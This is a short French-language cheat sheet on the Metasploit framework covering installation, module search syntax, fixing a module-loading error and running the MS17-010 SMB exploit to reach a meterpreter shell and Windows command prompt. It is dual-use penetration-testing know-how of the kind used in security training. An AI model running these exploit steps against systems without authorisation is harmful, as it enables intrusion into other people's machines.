# Metasploit

# Basics

```shell
msfconsole
msfconsole -q # supprimer la banner
```

## Install

```shell
sudo apt update && sudo apt install metasploit-framework
```

## Debug exemple

en cas d'erreur de type 
``` shell
msf > search wp_admin
Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


msf > use 0
[-] The supplied module name is ambiguous: uninitialized constant HTTP.


msf > reload_all
[*] Reloading modules from all module paths...

```
Et du coup ça fonctionne

```shell
msf > search wp_admin

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_admin_shell_upload

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(unix/webapp/wp_admin_shell_upload) >
```

## Bien chercher
```shell
msf > help search
msf > search eternalromance
msf > search eternalromance type:exploit
msf > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## Syntaxe des modules

```
<No.> <type>/<os>/<service>/<name>
794   exploit/windows/ftp/scriptftp_list
```

## Info
Dans un module on peut faire la commande info, exemple

```shell
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group
[...]

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
[...]

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

## Run et Shell

```shell
msf exploit(windows/smb/ms17_010_psexec) > run
[...]
meterpreter> shell
C:\Windows\system32>
```